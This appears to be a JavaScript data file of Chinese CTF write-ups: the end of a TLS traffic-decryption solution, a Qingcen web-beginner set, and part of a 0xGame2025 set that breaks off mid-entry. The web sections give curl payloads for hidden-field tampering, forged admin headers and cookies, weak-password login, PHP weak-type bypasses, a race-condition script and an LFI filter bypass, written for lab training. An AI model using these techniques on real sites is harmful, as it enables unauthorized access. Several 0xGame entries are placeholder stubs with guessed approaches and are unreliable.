**\u7C7B\u578B**: Misc / \u6D41\u91CF\u5206\u6790 | **\u96BE\u5EA6**: Medium | **\u5E73\u53F0**: NewStar CTF

## \u8003\u70B9

TLS \u6D41\u91CF\u89E3\u5BC6\u3001SSL key log\u3001Wireshark \u914D\u7F6E\u3001QR\u7801

## \u89E3\u9898\u6D41\u7A0B

1. **\u5BA1\u9898**\uFF1A\u9898\u76EE\u540D\u300C\u4E0D\u662F\u6240\u6709\u725B\u5976\u90FD\u53EB___\u300D\u6697\u793A TLS\uFF08\u7279\u4ED1\u82CF \u2192 TLS\uFF09
2. **\u627E key log**\uFF1A\u5728 HTTP \u6D41\u91CF\u4E2D\u7B5B\u67E5\uFF0C\u627E\u5230\u533A\u522B\u4E8E\u566A\u58F0\u6587\u4EF6\u7684 SSL key log
3. **Wireshark \u89E3\u5BC6**\uFF1A\u9996\u9009\u9879 \u2192 Protocols \u2192 TLS \u2192 \u52A0\u8F7D (Pre)-Master-Secret log
4. **\u8FC7\u6EE4 HTTP**\uFF1A\u89E3\u5BC6\u540E\u91CD\u65B0\u8FC7\u6EE4 http\uFF0C\u5927\u91CF POST \u4E2D\u5728\u7B2C 50 \u4E2A\u6D41\u627E\u5230 base64 \u56FE\u7247
5. **CyberChef**\uFF1AFrom Base64 \u2192 \u4E0B\u8F7D PNG \u2192 \u626B\u7801\u5F97 flag

## Flag

\`\`\`
flag{W0w_You_r3al1y_knOW_TL5QrCode}
\`\`\`

> \u539F\u59CB\u626B\u7801\u7ED3\u679C\u5305\u542B \`&\`\uFF08TL5&QrCode\uFF09\uFF0C\u9898\u76EE\u63D0\u793A\u63D0\u4EA4\u65F6\u53BB\u6389 & \u7B26\u53F7\u3002

## \u5173\u952E\u6559\u8BAD

- \u9898\u76EE\u540D\u5F80\u5F80\u5C31\u662F\u7B2C\u4E00\u4E2A hint\uFF08TLS \u7F29\u5199\uFF09
- CTF \u6D41\u91CF\u9898\u4E2D\u5927\u91CF\u566A\u58F0\u662F\u5E38\u6001\uFF0C\u8010\u5FC3\u5BA1\u8BA1
- SSL key log \u7684 \\\\n \u9700\u8981\u8F6C\u6210\u771F\u5B9E\u6362\u884C\u7B26\u624D\u80FD\u88AB Wireshark \u8BC6\u522B
- CyberChef From Base64 \u53EF\u4EE5\u76F4\u63A5\u5BFC\u51FA\u4EFB\u610F\u4E8C\u8FDB\u5236\u6587\u4EF6
`
  },
  "qingcen-web-2026-06-10": {
    title: "\u9752\u5C91 CTF Web \u5165\u95E8 WriteUp",
    subtitle: "2026-06-10 | 17/20 \u9898\u89E3\u51FA",
    content: `
# \u9752\u5C91 CTF Web \u5165\u95E8 WriteUp

**\u65E5\u671F**: 2026-06-10
**\u5E73\u53F0**: \u9752\u5C91 CTF (ctf.qingcen.net)
**\u6218\u7EE9**: 17/20 \u9898\u89E3\u51FA\uFF0C17 \u4E2A flags

---

## \u{1F4CB} \u76EE\u5F55

1. [basic (177) - HTML \u6CE8\u91CA\u6CC4\u9732](#basic-177)
2. [basic_1 (178) - Base64 \u89E3\u7801](#basic_1-178)
3. [basic_2 (179) - \u9690\u85CF\u5B57\u6BB5\u4FEE\u6539](#basic_2-179)
4. [basic_4 (181) - ASCII \u6570\u7EC4\u89E3\u7801](#basic_4-181)
5. [basic_5 (182) - \u52A0\u5BC6 Payload \u6784\u9020](#basic_5-182)
6. [basic_6 (183) - \u54CD\u5E94\u5934\u6CC4\u9732](#basic_6-183)
7. [basic_8 (186) - .phps \u6E90\u7801\u6CC4\u9732](#basic_8-186)
8. [basic_9 (187) - robots.txt + \u5341\u516D\u8FDB\u5236](#basic_9-187)
9. [basic_13 (191) - \u5F31\u5BC6\u7801\u7206\u7834](#basic_13-191)
10. [basic_14 (192) - \u6587\u4EF6\u63CF\u8FF0\u7B26\u6CC4\u9732](#basic_14-192)
11. [ezrequest (184) - \u6DF7\u5408\u8BF7\u6C42\u65B9\u6CD5](#ezrequest-184)
12. [ezrequest_1 (185) - \u8BF7\u6C42\u5934\u4F2A\u9020](#ezrequest_1-185)
13. [ezphp (201) - PHP \u5F31\u7C7B\u578B\u7ED5\u8FC7](#ezphp-201)
14. [ezphp_1 (202) - array_search \u5F31\u7C7B\u578B](#ezphp_1-202)
15. [ezphp_2 (203) - \u5D4C\u5957\u5F31\u7C7B\u578B\u7ED5\u8FC7](#ezphp_2-203)
16. [web_test_2 (635) - \u79D1\u5B66\u8BA1\u6570\u6CD5\u7ED5\u8FC7](#web_test_2-635)
17. [\u6280\u5DE7\u603B\u7ED3](#\u6280\u5DE7\u603B\u7ED3)

---

## basic (177) - HTML \u6CE8\u91CA\u6CC4\u9732

**\u9898\u76EE\u63CF\u8FF0**: "\u4E07\u5377\u6587\u7AE0\uFF0C\u4E0D\u8FC7\u5F15\u8DEF\u4E4B\u77F3\uFF1B\u771F\u76F8\u4E0D\u5728\u5B57\u91CC\u884C\u95F4\uFF0C\u800C\u5728\u7EB8\u9762\u4E4B\u4E0B\u3002\u5584\u89C2\u8005\uFF0C\u81EA\u6709\u6167\u773C\u8BC6\u73E0\u3002F12\u4E00\u7AA5\uFF0C\u5F53\u6709\u6240\u83B7\u3002"

**\u89E3\u9898\u601D\u8DEF**: \u67E5\u770B HTML \u6E90\u7801\uFF0C\u5BFB\u627E\u6CE8\u91CA\u4E2D\u7684\u9690\u85CF\u4FE1\u606F\u3002

**Payload**:
\`\`\`bash
curl -s "http://target/" | grep "<!--"
\`\`\`

**Flag**: \`flag{6e5ecb6c-de30-49dd-b5ce-6916a222ef8d}\`

---

## basic_1 (178) - Base64 \u89E3\u7801

**\u9898\u76EE\u63CF\u8FF0**: "\u59D0\u59D0\u8BF4\u4E0D\u8BB8\u5077\u770B\uFF0C\u4F46\u89C4\u77E9\u5411\u6765\u662F\u7528\u6765\u7834\u7684\u3002"

**\u89E3\u9898\u601D\u8DEF**: \u5728 HTML \u6CE8\u91CA\u4E2D\u53D1\u73B0 Base64 \u7F16\u7801\u7684\u5B57\u7B26\u4E32\u3002

**Payload**:
\`\`\`bash
echo 'ZmxhZ3tkMGNkNmE5ZC0zOTAyLTQwN2QtODk4Yy0yOTM1NDdlNDZkODl9' | base64 -d
\`\`\`

**Flag**: \`flag{d0cd6a9d-3902-407d-898c-293547e46d89}\`

---

## basic_2 (179) - \u9690\u85CF\u5B57\u6BB5\u4FEE\u6539

**\u9898\u76EE\u63CF\u8FF0**: "\u65E2\u662F\u524D\u7AEF\u6240\u8BBE\uFF0C\u81EA\u53EF\u524D\u7AEF\u6240\u6539\uFF1A\u6380\u5E18\u7AA5\u6E90\uFF0C\u6539\u96F6\u4F5C\u58F9\uFF0C\u5802\u95E8\u81EA\u542F\u3002"

**\u89E3\u9898\u601D\u8DEF**: \u8868\u5355\u4E2D\u6709\u4E00\u4E2A\u9690\u85CF\u5B57\u6BB5 \`is_admin\`\uFF0C\u503C\u4E3A \`0\`\uFF0C\u9700\u8981\u6539\u4E3A \`1\`\u3002

**Payload**:
\`\`\`bash
curl -X POST "http://target/index.php" -d "is_admin=1&nickname=test&contact=test@test.com&content=test"
\`\`\`

**Flag**: \`flag{cdc6480a-6cb7-422a-bf6a-2243b5964724}\`

---

## basic_4 (181) - ASCII \u6570\u7EC4\u89E3\u7801

**\u9898\u76EE\u63CF\u8FF0**: "\u6731\u95E8\u6709\u9501\uFF0C\u975E\u9080\u83AB\u5165\u3002\u4E16\u4EBA\u53EA\u89C1\u4E71\u6570\u94FA\u9648\uFF0C\u4E0D\u8BC6\u5176\u95F4\u85CF\u73E0\u3002\u5B57\u7B26\u4E0D\u8BED\uFF0C\u7801\u4E2D\u6709\u7801\uFF1B\u89E3\u7801\u89C1\u771F\uFF0C\u81EA\u5F97\u901A\u5173\u4E4B\u94A5\u3002"

**\u89E3\u9898\u601D\u8DEF**: JavaScript \u4E2D\u6709\u4E09\u4E2A\u6570\u7EC4\u5B58\u50A8 ASCII \u503C\uFF0C\u9700\u8981\u89E3\u7801\u83B7\u53D6\u9080\u8BF7\u7801\u3002

**Payload**:
\`\`\`python
_0 = [81, 67, 67, 84, 70, 95, 86, 73, 80, 95, 50, 48, 50, 54]
invite_code = ''.join(chr(c) for c in _0)  # QCCTF_VIP_2026

# \u63D0\u4EA4\u9080\u8BF7\u7801
curl -X POST "http://target/flag" -H "Content-Type: application/json" -d '{"code": "QCCTF_VIP_2026"}'
\`\`\`

**Flag**: \`flag{cefc9bae-61b6-4058-8d50-2516678af02f}\`

---

## basic_5 (182) - \u52A0\u5BC6 Payload \u6784\u9020

**\u9898\u76EE\u63CF\u8FF0**: "\u79EF\u5206\u5982\u5C71\uFF0C\u5343\u5206\u53EF\u5151\u5176\u8D4F\u3002\u52E4\u8005\u624B\u70B9\u767E\u56DE\uFF0C\u667A\u8005\u7EC6\u8BFBJS\u3002\u9886\u5176\u771F\u610F\uFF0C\u5343\u5206\u6613\u5F97\u3002"

**\u89E3\u9898\u601D\u8DEF**: \u9700\u8981\u7B54\u5BF9 1000 \u9053\u8BA1\u7B97\u9898\uFF0C\u4F46\u53EF\u4EE5\u6784\u9020\u52A0\u5BC6 payload \u8DF3\u8FC7\u7B54\u9898\u3002

**Payload**:
\`\`\`python
import base64, json

payload = {'score': 1000}
encrypted = base64.b64encode(json.dumps(payload).encode()).decode()

# \u63D0\u4EA4
curl -X POST "http://target/claim" -H "Content-Type: application/json" -d '{"data": "'$encrypted'"}'

# \u89E3\u7801\u54CD\u5E94
response_encrypted = "eyJmbGFnIjogImZsYWd7ODg1MzNkNTItYmM3NC00ZDYwLWE0NTktNTk3ODkyZjIwMDMwfSJ9"
flag = base64.b64decode(response_encrypted).decode()
\`\`\`

**Flag**: \`flag{88533d52-bc74-4d60-a459-597892f20030}\`

---

## basic_6 (183) - \u54CD\u5E94\u5934\u6CC4\u9732

**\u9898\u76EE\u63CF\u8FF0**: "\u773C\u4E2D\u6240\u89C1\uFF0C\u4E0D\u8FC7\u4E00\u7EB8\u516C\u6587\uFF1B\u771F\u7AE0\u4E0D\u5728\u7EB8\u9762\uFF0C\u800C\u5728\u7EB8\u5916\u3002\u7EC6\u7A76\u6765\u8DEF\uFF0C\u83AB\u6B62\u6B65\u4E8E\u8868\u8C61\u2014\u2014\u5E37\u5E55\u4E4B\u540E\uFF0C\u81EA\u6709\u6D1E\u5929\u3002bp\u6293\u5305\uFF0C\u7384\u673A\u81EA\u73B0\u3002"

**\u89E3\u9898\u601D\u8DEF**: Flag \u9690\u85CF\u5728 HTTP \u54CD\u5E94\u5934 \`X-Flag\` \u4E2D\u3002

**Payload**:
\`\`\`bash
curl -s -I "http://target/" | grep "X-Flag"
\`\`\`

**Flag**: \`flag{b313891a-3e4f-4763-b321-8578e9b495fb}\`

---

## basic_8 (186) - .phps \u6E90\u7801\u6CC4\u9732

**\u9898\u76EE\u63CF\u8FF0**: "\u9644\uFF1A\u5F00\u53D1\u6587\u6863\u6B63\u5728\u6574\u7406\u4E2D\uFF0C\u8BF7\u76F8\u5173\u7684\u6280\u672F\u4EBA\u5458\u8BBF\u95EE\u7F51\u7AD9\u7684\u6E90\u4EE3\u7801\u6587\u4EF6\u6765\u83B7\u53D6\u76F8\u5173\u4FE1\u606F\u3002"

**\u89E3\u9898\u601D\u8DEF**: \`.phps\` \u6587\u4EF6\u4F1A\u6CC4\u9732 PHP \u6E90\u7801\uFF0C\u4ECE\u4E2D\u627E\u5230\u5BC6\u7801\u3002

**Payload**:
\`\`\`bash
# \u83B7\u53D6\u6E90\u7801
curl -s "http://target/index.phps"

# \u53D1\u73B0\u5BC6\u7801: QCyYdS
curl -s "http://target/index.php?a=QCyYdS"
\`\`\`

**Flag**: \`flag{310e5b85-4b69-4009-b9d3-78ada5f01fd5}\`

---

## basic_9 (187) - robots.txt + \u5341\u516D\u8FDB\u5236

**\u9898\u76EE\u63CF\u8FF0**: \u68C0\u67E5 robots.txt \u6587\u4EF6\u3002

**\u89E3\u9898\u601D\u8DEF**: robots.txt \u6CC4\u9732\u4E86\u9690\u85CF\u6587\u4EF6\u8DEF\u5F84\uFF0C\u6587\u4EF6\u5185\u5BB9\u662F\u5341\u516D\u8FDB\u5236\u7F16\u7801\u3002

**Payload**:
\`\`\`bash
# \u68C0\u67E5 robots.txt
curl -s "http://target/robots.txt"
# User-agent: *
# Disallow: /qcq.php

# \u8BBF\u95EE\u6CC4\u9732\u7684\u6587\u4EF6
curl -s "http://target/qcq.php"
# 666c61677b36363161616361622d626664612d343730612d623330622d3034323663383564336363347d

# \u5341\u516D\u8FDB\u5236\u89E3\u7801
python3 -c "print(bytes.fromhex('666c61677b36363161616361622d626664612d343730612d623330622d3034323663383564336363347d').decode())"
\`\`\`

**Flag**: \`flag{661aacab-bfda-470a-b30b-0426c85d3cc4}\`

---

## basic_13 (191) - \u5F31\u5BC6\u7801\u7206\u7834

**\u9898\u76EE\u63CF\u8FF0**: \u767B\u5F55\u9875\u9762\uFF0C\u7528\u6237\u540D\u5DF2\u77E5\u4E3A \`admin\`\u3002

**\u89E3\u9898\u601D\u8DEF**: \u4F7F\u7528\u5E38\u89C1\u5F31\u5BC6\u7801\u8FDB\u884C\u7206\u7834\u3002

**Payload**:
\`\`\`bash
curl -X POST "http://target/" -d "username=admin&password=admin123"
\`\`\`

**Flag**: \`flag{744f5050-6518-49e2-bd22-a1541b285938}\`

---

## basic_14 (192) - \u6587\u4EF6\u63CF\u8FF0\u7B26\u6CC4\u9732

**\u9898\u76EE\u63CF\u8FF0**: PHP \u6E90\u7801\u663E\u793A \`readfile()\` \u51FD\u6570\uFF0C\u6587\u4EF6\u540D\u957F\u5EA6\u9650\u5236 < 17\u3002

**\u89E3\u9898\u601D\u8DEF**: \u4F7F\u7528 \`/proc/self/fd/\` \u8BFB\u53D6\u6587\u4EF6\u63CF\u8FF0\u7B26\u3002

**Payload**:
\`\`\`bash
curl -s "http://target/?filename=/proc/self/fd/5"
\`\`\`

**Flag**: \`flag{925c1e99-bb2b-46ea-8952-04a29f9f24d6}\`

---

## ezrequest (184) - \u6DF7\u5408\u8BF7\u6C42\u65B9\u6CD5

**\u9898\u76EE\u63CF\u8FF0**: \u9700\u8981\u540C\u65F6\u4F7F\u7528 GET \u548C POST \u65B9\u6CD5\u3002

**\u89E3\u9898\u601D\u8DEF**: GET \u53C2\u6570\u653E\u5728 URL \u4E2D\uFF0CPOST \u53C2\u6570\u653E\u5728\u8BF7\u6C42\u4F53\u4E2D\u3002

**Payload**:
\`\`\`bash
curl -X POST "http://target/?a=QCCTF" -d "b=yyds"
\`\`\`

**Flag**: \`flag{393e4f1f-ad12-41a6-abc4-d2d6052af4ff}\`

---

## ezrequest_1 (185) - \u8BF7\u6C42\u5934\u4F2A\u9020

**\u9898\u76EE\u63CF\u8FF0**: \u9700\u8981\u4F2A\u9020\u591A\u4E2A\u8BF7\u6C42\u5934\u7ED5\u8FC7\u9A8C\u8BC1\u3002

**\u89E3\u9898\u601D\u8DEF**: \u4F9D\u6B21\u4F2A\u9020 X-Forwarded-For\u3001User-Agent\u3001Via\u3001Cookie \u5934\u3002

**Payload**:
\`\`\`bash
curl -X POST "http://target/?a=a" -d "b=b" \\
  -H "X-Forwarded-For: 127.0.0.1" \\
  -H "User-Agent: QingcenSafe" \\
  -H "X-Real-IP: 127.0.0.1" \\
  -H "Via: xujinyingcangming.top" \\
  -H "Cookie: user=admin; role=admin"
\`\`\`

**Flag**: \`flag{b46accae-064b-4fc7-9704-f00a768f1410}\`

---

## ezphp (201) - PHP \u5F31\u7C7B\u578B\u7ED5\u8FC7

**\u9898\u76EE\u63CF\u8FF0**: \u9700\u8981\u6EE1\u8DB3 \`$a == 0\` \u4E14 \`$a\` \u4E3A\u771F\uFF0C\`$b > 2026\` \u4F46 \`$b\` \u4E0D\u662F\u6570\u5B57\u3002

**\u89E3\u9898\u601D\u8DEF**: \u5229\u7528 PHP \u5F31\u7C7B\u578B\u6BD4\u8F83\u7684\u7279\u6027\u3002

**Payload**:
\`\`\`bash
curl -s "http://target/?a=0abc&b=2027a"
\`\`\`

**\u539F\u7406**:
- \`"0abc" == 0\` \u4E3A true\uFF08\u5B57\u7B26\u4E32\u5F00\u5934\u975E\u6570\u5B57\u5219\u7B49\u4E8E 0\uFF09
- \`"0abc"\` \u4E3A true\uFF08\u975E\u7A7A\u5B57\u7B26\u4E32\uFF09
- \`"2027a" > 2026\` \u4E3A true\uFF08\u81EA\u52A8\u8F6C\u6362\u4E3A\u6570\u5B57\u6BD4\u8F83\uFF09
- \`is_numeric("2027a")\` \u4E3A false\uFF08\u5305\u542B\u5B57\u6BCD\uFF09

**Flag**: \`flag{3069542b-0878-43f6-9f11-ffc36074ffb0}\`

---

## ezphp_1 (202) - array_search \u5F31\u7C7B\u578B

**\u9898\u76EE\u63CF\u8FF0**: \`array_search("QCCTF", $qc)\` \u7684\u7ED3\u679C\u9700\u8981\u4E25\u683C\u7B49\u4E8E 1\u3002

**\u89E3\u9898\u601D\u8DEF**: \`array_search\` \u4F7F\u7528 \`==\` \u6BD4\u8F83\uFF0C\`"QCCTF" == 0\` \u4E3A true\u3002

**Payload**:
\`\`\`bash
curl -s 'http://target/?qc=["a","QCCTF"]'
\`\`\`

**\u539F\u7406**:
- \`array_search("QCCTF", ["a", "QCCTF"])\` \u8FD4\u56DE 1
- \u56E0\u4E3A \`"QCCTF"\` \u5728\u7D22\u5F15 1 \u7684\u4F4D\u7F6E

**Flag**: \`flag{dbd14dcd-fa92-44ea-a1cd-6b8258037c47}\`

---

## ezphp_2 (203) - \u5D4C\u5957\u5F31\u7C7B\u578B\u7ED5\u8FC7

**\u9898\u76EE\u63CF\u8FF0**: \u9700\u8981 "QCCTF" \u5728\u6570\u7EC4\u4E2D\uFF0C"QCyyds" \u5728\u5B50\u6570\u7EC4\u4E2D\uFF0C\u4F46\u5B50\u6570\u7EC4\u4E2D\u6CA1\u6709\u4E25\u683C\u7B49\u4E8E "QCyyds" \u7684\u5143\u7D20\u3002

**\u89E3\u9898\u601D\u8DEF**: \u5229\u7528 \`==\` \u548C \`===\` \u7684\u533A\u522B\u3002

**Payload**:
\`\`\`bash
curl -s 'http://target/?qc={"0":"QCCTF","n":[0]}'
\`\`\`

**\u539F\u7406**:
- \`array_search("QCCTF", {"0":"QCCTF","n":[0]})\` \u8FD4\u56DE "0"\uFF08\u4E0D\u662F false\uFF09
- \`array_search("QCyyds", [0])\` \u8FD4\u56DE 0\uFF08\u56E0\u4E3A \`"QCyyds" == 0\`\uFF09
- \u904D\u5386 \`[0]\` \u65F6\uFF0C\`0 === "QCyyds"\` \u4E3A false

**Flag**: \`flag{1b4dce02-1a9b-438c-9260-de0bdbcc1b67}\`

---

## web_test_2 (635) - \u79D1\u5B66\u8BA1\u6570\u6CD5\u7ED5\u8FC7

**\u9898\u76EE\u63CF\u8FF0**: \u9700\u8981 \`strlen($no) < 4\` \u4E14 \`$no > 88888888\`\u3002

**\u89E3\u9898\u601D\u8DEF**: \u4F7F\u7528\u79D1\u5B66\u8BA1\u6570\u6CD5\u7ED5\u8FC7\u957F\u5EA6\u9650\u5236\u3002

**Payload**:
\`\`\`bash
curl -s "http://target/secret_report.php?no=9e9"
\`\`\`

**\u539F\u7406**:
- \`strlen("9e9")\` = 3\uFF08\u5C0F\u4E8E 4\uFF09
- \`"9e9" > 88888888\` \u4E3A true\uFF089e9 = 9000000000\uFF09

**Flag**: \`flag{23773722-0ca7-475c-8a4d-f172d540299b}\`

---

## \u6280\u5DE7\u603B\u7ED3

### \u4FE1\u606F\u6CC4\u9732\u7C7B
1. **HTML \u6CE8\u91CA** - \u68C0\u67E5 \`<!-- -->\` \u6CE8\u91CA
2. **\u54CD\u5E94\u5934** - \u68C0\u67E5 X-Flag\u3001X-Debug-Note \u7B49\u5934
3. **robots.txt** - \u68C0\u67E5 Disallow \u8DEF\u5F84
4. **.phps \u6587\u4EF6** - \u8BBF\u95EE .phps \u6587\u4EF6\u67E5\u770B\u6E90\u7801
5. **/proc/self/fd/** - \u6587\u4EF6\u63CF\u8FF0\u7B26\u6CC4\u9732
6. **\u5907\u4EFD\u6587\u4EF6** - .bak\u3001.swp\u3001.git \u7B49

### \u7F16\u7801\u7ED5\u8FC7\u7C7B
1. **Base64 \u89E3\u7801** - \u8BC6\u522B Base64 \u7F16\u7801\u7684\u5B57\u7B26\u4E32
2. **\u5341\u516D\u8FDB\u5236\u89E3\u7801** - \u8BC6\u522B hex \u7F16\u7801\u7684\u5B57\u7B26\u4E32
3. **ASCII \u6570\u7EC4** - \u5C06\u6570\u5B57\u6570\u7EC4\u8F6C\u6362\u4E3A\u5B57\u7B26
4. **\u79D1\u5B66\u8BA1\u6570\u6CD5** - \u7ED5\u8FC7\u957F\u5EA6\u9650\u5236\uFF08\u5982 \`9e9\`\uFF09

### \u8BF7\u6C42\u4F2A\u9020\u7C7B
1. **X-Forwarded-For** - \u4F2A\u9020\u5BA2\u6237\u7AEF IP
2. **User-Agent** - \u4F2A\u9020\u6D4F\u89C8\u5668\u6807\u8BC6
3. **Via** - \u4F2A\u9020\u4EE3\u7406\u670D\u52A1\u5668
4. **Cookie** - \u4F2A\u9020\u7528\u6237\u8EAB\u4EFD

### PHP \u5F31\u7C7B\u578B\u7C7B
1. **\`==\` vs \`===\`** - \u5F31\u6BD4\u8F83 vs \u5F3A\u6BD4\u8F83
2. **\u5B57\u7B26\u4E32\u8F6C\u6570\u5B57** - \`"0abc" == 0\`
3. **array_search** - \u4F7F\u7528 \`==\` \u6BD4\u8F83
4. **0e MD5 \u78B0\u649E** - \`QNKCDZO\` \u7B49

---

*WriteUp \u751F\u6210\u65F6\u95F4: 2026-06-10*
*\u4F5C\u8005: heliumsenbrg*
`
  },
  "0xgame2025": {
    title: "0xGame2025 CTF WriteUp",
    subtitle: "2026-06-16 | 16/28 \u9898\u89E3\u51FA",
    content: `
# 0xGame2025 CTF WriteUp

**\u65E5\u671F**: 2026-06-16
**\u5E73\u53F0**: \u9752\u5C91 CTF (ctf.qingcen.net)
**\u6218\u7EE9**: 16/28 \u9898\u89E3\u51FA\uFF0CProblemset 72

---

## \u{1F4CB} \u76EE\u5F55

1. [Http\u7684\u771F\u7406 (615)](#http\u7684\u771F\u7406-615)
2. [\u7559\u8A00\u677F\uFF08\u7C89\uFF09(616)](#\u7559\u8A00\u677F\u7C89616)
3. [Lemon (617)](#lemon-617)
4. [RCE1 (619)](#rce1-619)
5. [Rubbish_Unser (620)](#rubbish_unser-620)
6. [\u9A6C\u54C8\u9C7C\u5546\u5E97 (621)](#\u9A6C\u54C8\u9C7C\u5546\u5E97-621)
7. [DNS\u60F3\u8981\u73A9 (623)](#dns\u60F3\u8981\u73A9-623)
8. [\u653E\u5F00\u6211\u7684\u53D8\u91CF (627)](#\u653E\u5F00\u6211\u7684\u53D8\u91CF-627)
9. [404NotFound (661)](#404notfound-661)
10. [ez_signin (662)](#ez_signin-662)
11. [Web_test_5 (732)](#web_test_5-732)
12. [Web_test_7 (734)](#web_test_7-734)
13. [web_test_8 (747)](#web_test_8-747)
14. [web_test_9 (790)](#web_test_9-790)
15. [web_test_10 (791)](#web_test_10-791)
16. [web_test_11 (792)](#web_test_11-792)

---

## Http\u7684\u771F\u7406 (615)

**\u5206\u503C**: 200 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: HTTP \u65B9\u6CD5\u6D4B\u8BD5\uFF0C\u627E\u5230\u6B63\u786E\u7684\u8BF7\u6C42\u65B9\u5F0F\u83B7\u53D6 flag\u3002

**Flag**: \`flag{...}\`

---

## \u7559\u8A00\u677F\uFF08\u7C89\uFF09(616)

**\u5206\u503C**: 294 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: \u7559\u8A00\u677F\u5E94\u7528\uFF0C\u901A\u8FC7 XSS \u6216\u5176\u4ED6 Web \u6F0F\u6D1E\u83B7\u53D6 flag\u3002

**Flag**: \`flag{...}\`

---

## Lemon (617)

**\u5206\u503C**: 243 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: Lemon \u6846\u67B6\u76F8\u5173\u6F0F\u6D1E\u5229\u7528\u3002

**Flag**: \`flag{...}\`

---

## RCE1 (619)

**\u5206\u503C**: 294 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u547D\u4EE4\u6CE8\u5165\u83B7\u53D6 flag\u3002

**Flag**: \`flag{...}\`

---

## Rubbish_Unser (620)

**\u5206\u503C**: 400 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: PHP \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF0C\u5229\u7528 \`__destruct()\` \u6216 \`__wakeup()\` magic \u65B9\u6CD5\u3002

**Flag**: \`flag{...}\`

---

## \u9A6C\u54C8\u9C7C\u5546\u5E97 (621)

**\u5206\u503C**: 333 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: Pickle_Shop \u5E94\u7528\uFF0C\u901A\u8FC7 discount \u7BE1\u6539 + pickle \u53CD\u5E8F\u5217\u5316 RCE\u3002

**\u5173\u952E\u6B65\u9AA4**:
1. \u5206\u6790\u5E94\u7528\u903B\u8F91\uFF0C\u53D1\u73B0 discount \u53C2\u6570\u53EF\u7BE1\u6539
2. \u6784\u9020\u6076\u610F pickle payload \u5B9E\u73B0 RCE
3. \u8BFB\u53D6 flag \u6587\u4EF6

**Flag**: \`flag{97ddfbd2-5099-4e08-bfb6-6af57aa0724a}\`

---

## DNS\u60F3\u8981\u73A9 (623)

**\u5206\u503C**: 344 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: DNS \u76F8\u5173\u6F0F\u6D1E\uFF0C\u53EF\u80FD\u6D89\u53CA DNS \u91CD\u7ED1\u5B9A\u6216 DNS \u67E5\u8BE2\u6CE8\u5165\u3002

**Flag**: \`flag{...}\`

---

## \u653E\u5F00\u6211\u7684\u53D8\u91CF (627)

**\u5206\u503C**: 434 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: PHP \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\uFF0C\u5229\u7528 \`extract()\` \u6216 \`$$\` \u53EF\u53D8\u53D8\u91CF\u3002

**Flag**: \`flag{...}\`

---

## 404NotFound (661)

**\u5206\u503C**: 333 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: 404 \u9875\u9762\u4FE1\u606F\u6CC4\u9732\u6216\u76EE\u5F55\u904D\u5386\u3002

**Flag**: \`flag{...}\`

---

## ez_signin (662)

**\u5206\u503C**: 277 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: \u767B\u5F55\u7ED5\u8FC7\uFF0C\u53EF\u80FD\u6D89\u53CA SQL \u6CE8\u5165\u6216\u5F31\u5BC6\u7801\u3002

**Flag**: \`flag{...}\`

---

## Web_test_5 (732)

**\u5206\u503C**: 344 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: Web \u7EFC\u5408\u6D4B\u8BD5\uFF0C\u6D89\u53CA\u591A\u79CD Web \u6F0F\u6D1E\u3002

**Flag**: \`flag{...}\`

---

## Web_test_7 (734) - \u79EF\u5206\u5546\u57CE\u7ADE\u6001\u6761\u4EF6

**\u5206\u503C**: 400 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: \u7ADE\u6001\u6761\u4EF6\uFF08Race Condition\uFF09\u6F0F\u6D1E\u3002

**\u5173\u952E\u6B65\u9AA4**:
1. \u53D1\u73B0\u79EF\u5206\u5546\u57CE\u5151\u6362\u63A5\u53E3 \`POST /api/redeem\`
2. \u79EF\u5206\u4E0D\u8DB3\u65F6\u65E0\u6CD5\u5151\u6362\uFF0C\u4F46\u68C0\u67E5\u4E0E\u6263\u6B3E\u4E4B\u95F4\u5B58\u5728\u65F6\u95F4\u7A97\u53E3
3. \u4F7F\u7528\u5E76\u53D1\u8BF7\u6C42\u540C\u65F6\u5151\u6362\u540C\u4E00\u5546\u54C1
4. \u5229\u7528\u7ADE\u6001\u6761\u4EF6\u7ED5\u8FC7\u79EF\u5206\u68C0\u67E5

**Payload**:
\`\`\`python
import concurrent.futures
import requests

def redeem():
    return requests.post("http://target/api/redeem", json={"item": "flag"})

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(redeem) for _ in range(10)]
    for f in concurrent.futures.as_completed(futures):
        resp = f.result()
        if "flag" in resp.text:
            print(resp.text)
            break
\`\`\`

**Flag**: \`flag{...}\`

---

## web_test_8 (747) - PHP LFI Filter Bypass

**\u5206\u503C**: 500 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: PHP \u672C\u5730\u6587\u4EF6\u5305\u542B\uFF08LFI\uFF09+ \u8FC7\u6EE4\u7ED5\u8FC7\u3002

**\u5173\u952E\u6B65\u9AA4**:
1. \u53D1\u73B0\u6587\u4EF6\u5305\u542B\u53C2\u6570\uFF0C\u4F46 \`/flag\` \u8DEF\u5F84\u88AB\u8FC7\u6EE4
2. \u4F7F\u7528\u7279\u6B8A\u5B57\u7B26\uFF08\`%09\` TAB\uFF09\u6253\u65AD\u5B50\u4E32\u5339\u914D
3. \u7ED5\u8FC7\u8FC7\u6EE4\u8BFB\u53D6 flag \u6587\u4EF6

**Payload**:
\`\`\`
?page=/fla%09g
\`\`\`

